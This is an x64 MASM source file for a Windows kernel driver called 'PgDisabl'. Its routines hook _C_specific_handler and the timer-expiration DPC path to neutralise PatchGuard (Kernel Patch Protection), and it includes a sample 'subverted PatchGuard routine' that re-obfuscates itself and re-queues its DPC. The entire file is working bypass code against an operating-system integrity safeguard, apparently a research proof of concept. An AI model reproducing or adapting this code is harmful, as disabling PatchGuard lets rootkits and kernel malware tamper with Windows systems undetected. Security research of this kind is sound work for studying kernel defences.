;
; Assembler support routines for the PgDisabl driver.
;
; Note that, unlike typical x64 assembler routines, these routines do not
; comply fully with the requirements of the x64 calling convention.  This is
; due to the highly non-standard environment in which these routines are used.
;
; It is highly recommended that all assembler source code for the Windows x64
; platform fully comply with the calling convention (including the use of unwid
; metadata) in normal circumstances.
;

.data

EXTERN Orig_C_specific_handlerRestorePointer:PROC
EXTERN My_C_specific_handler:PROC
EXTERN _C_specific_handler:PROC
EXTERN PgCSpecificHandlerArguments:PROC
EXTERN PgKiTimerExpirationThunkJmp:PROC
EXTERN PgKiTimerExpirationThunkRetPoint:PROC
EXTERN PgTimerDpcFilter:PROC

.code

;
; Call _C_specific_handler...
;

public PgOrig_C_specific_handler_Srv03
PgOrig_C_specific_handler_Srv03 PROC

	mov         qword ptr [rsp+10h], rdx
	mov         rax, rsp
	sub         rsp, 88h
	jmp         qword ptr [Orig_C_specific_handlerRestorePointer]

PgOrig_C_specific_handler_Srv03 ENDP

public PgOrig_C_specific_handler_Vista
PgOrig_C_specific_handler_Vista PROC

	mov         r11, rsp
	mov         qword ptr [r11+08h], rbx
	mov         qword ptr [r11+18h], rbp
	mov         qword ptr [r11+20h], rsi

	jmp         qword ptr [Orig_C_specific_handlerRestorePointer]

PgOrig_C_specific_handler_Vista ENDP

public PgKiTimerExpirationThunk
PgKiTimerExpirationThunk PROC
;	int         3
	call        PgTimerDpcFilter
;	call        qword ptr [rbx]
	test        bpl, bpl
	je          DoIndirectJmp
	
	lea         rax, qword ptr [rsp+88h]
	
;	int         3
	
	jmp         qword ptr [PgKiTimerExpirationThunkRetPoint]
	
	DoIndirectJmp:
	
	jmp         qword ptr [PgKiTimerExpirationThunkJmp]

PgKiTimerExpirationThunk ENDP

public PgKiTimerExpirationThunk_Vista
PgKiTimerExpirationThunk_Vista PROC
;	int         3
	call        PgTimerDpcFilter
;	call        qword ptr [rbx]
	test        bpl, bpl
	je          DoIndirectJmp
	
	lea         rax, qword ptr [rsp+90h]
	
;	int         3
	
	jmp         qword ptr [PgKiTimerExpirationThunkRetPoint]
	
	DoIndirectJmp:
	
	jmp         qword ptr [PgKiTimerExpirationThunkJmp]

PgKiTimerExpirationThunk_Vista ENDP

;
; Fix arguments and jump to _C_specific_handler.
;
; Used to safely return to _C_specific_handler from our hook after we have
; unhooked from _C_specific_handler.  This works because _C_specific_handler
; uses no stack arguments.
;
; Also, in our context, _C_specific_handler calling into our hook in the code
; path that unhooks is non-reentrant and non-threaded, meaning the use of
; globals is relatively okay.
;

public PgCSpecificHandlerUnhookReturnPoint
PgCSpecificHandlerUnhookReturnPoint PROC

	mov        rcx, qword ptr [PgCSpecificHandlerArguments+00h]
	mov        rdx, qword ptr [PgCSpecificHandlerArguments+08h]
	mov        r8 , qword ptr [PgCSpecificHandlerArguments+10h]
	mov        r9 , qword ptr [PgCSpecificHandlerArguments+18h]
	
	jmp        qword ptr      [_C_specific_handler]

PgCSpecificHandlerUnhookReturnPoint ENDP

;
; Example subverted PatchGuard routine.
;
; This routine just does a DbgPrint.
;

public PgExampleReplacementRoutine
PgExampleReplacementRoutine PROC

	;
	; On entry:
	;
	; rcx: PgExampleReplacementRoutine
	; rdx: Decryption key
	; r8d: 0
	; r9d: 0
	;

	;
	; First instruction is fixed to this by PatchGuard (overwritten on each
	; call).
	;

	; +0
	lock xor   qword ptr [rcx], rdx

	;
	; Next four bytes need to be xor'd by part of the decryption key.
	;
	; We'll use this instruction to redo the obfuscation on the intermediate
	; four bytes as it needs to be reobfuscated, or the next call will crash.
	;
	; Otherwise, this is effectively just a nop four bytes.
	;

	; +4
	lock xor   qword ptr [rcx], rdx

	;
	; Next we make the sample call to DbgPrint.
	;
	; (Change the nop back into the int 3 in order to step through this part.)
	;
	
	; +8
	; int        3
	nop
	sub        rsp, 20h	
	push       rbx	
	mov        rbx, rcx

	lea        rcx, qword ptr [rcx+70h]
	call       qword ptr [rbx+40h] ; DbgPrint


	;
	; We need to re-set the "Type" and "DeferredContext" fields in the DPC.
	;

	mov        r8, qword ptr [rbx+50h]
	mov        rdx, qword ptr [rbx+58h]
	mov        byte ptr [r8+00h], 13h
	mov        qword ptr [r8+20h], rdx
	
	;
	; Re-queue the DPC for execution.
	;

	mov        rcx, qword ptr [rbx+60h]
	mov        rdx, qword ptr [rbx+68h]
	call       qword ptr [rbx+48h] ; KeSetTimer

	;
	; All done.
	;
	
	pop        rbx
	add        rsp, 20h
	
	ret
	
PgExampleReplacementRoutine ENDP
END
